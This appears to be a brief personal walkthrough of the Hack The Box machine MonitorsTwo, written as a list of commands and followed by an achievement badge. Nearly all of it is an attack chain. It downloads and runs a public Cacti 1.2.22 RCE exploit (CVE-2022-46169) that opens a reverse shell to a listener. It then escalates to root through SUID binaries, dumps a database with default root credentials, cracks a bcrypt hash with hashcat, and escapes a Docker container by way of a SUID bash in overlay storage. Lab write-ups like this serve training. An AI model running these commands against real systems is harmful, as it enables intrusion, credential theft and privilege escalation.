```
cacti 1.2.22 rce exploit

wget https://raw.githubusercontent.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/main/CVE-2022-46169.py

python3 CVE-2022-46169.py -u http://monitorstwo.htb/ --LHOST=10.10.14.13 --LPORT=4567


find / -user root -perm -4000 -print 2>/dev/null

/sbin/capsh --gid=0 --uid=0 --

whoami root

#But we are inside docker

cd /

shows entrpoint.sh

we can try to 

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

mysql --host=db --user=root --password=root cacti -e "show tables"

mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"

hashcat marcus-hash -m 3200 rockyou.txt

ssh marcus@twomonitors.htb

# use docker root to gain root

go back to docker :
chmod u+s /bin/bash

go back to ssh user:

find / -user root -perm -4000 -print 2>/dev/null

find / -user root -perm -4000 -print 2>/dev/null | grep /bin/bash

/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin/bash

whoami root
```
https://www.hackthebox.com/achievement/machine/336799/539


![Jackmeister](https://www.hackthebox.eu/badge/image/336799)





